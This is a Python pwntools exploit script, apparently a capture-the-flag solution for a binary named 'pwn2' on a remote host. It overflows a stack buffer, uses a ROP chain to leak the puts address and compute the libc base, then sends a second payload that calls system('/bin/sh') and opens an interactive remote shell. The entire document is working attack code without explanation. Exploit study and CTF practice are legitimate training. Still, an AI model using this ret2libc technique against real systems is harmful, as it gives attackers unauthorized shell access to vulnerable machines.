from pwn import *
context.log_level = "debug"
# p = process("./pwn2")
p = remote("114.116.54.89" , 10003)
elf = ELF("./pwn2")
libc = elf.libc

pop_rdi_ret = 0x4007e3
# get libc base
payload = "a" * 0x30 + "b" * 8 
payload += p64(pop_rdi_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
p.sendafter("say something?\n" , payload)

p.recvuntil("oh,that's so boring!\n")
puts_addr = u64(p.recvline()[:-1].ljust(8 , "\x00"))
# puts_addr = libc_base + libc.sym["puts"] # libc_base is libc.address
libc.address = puts_addr - libc.sym["puts"]
# get shell
payload2 = "a" * 0x30 + "b" * 8 
payload2 += p64(pop_rdi_ret) + p64(libc.search("/bin/sh").next()) + p64(libc.sym["system"])
# system("/bin/sh")
p.sendafter("say something?\n" , payload2)
p.recvuntil("oh,that's so boring!")

p.interactive()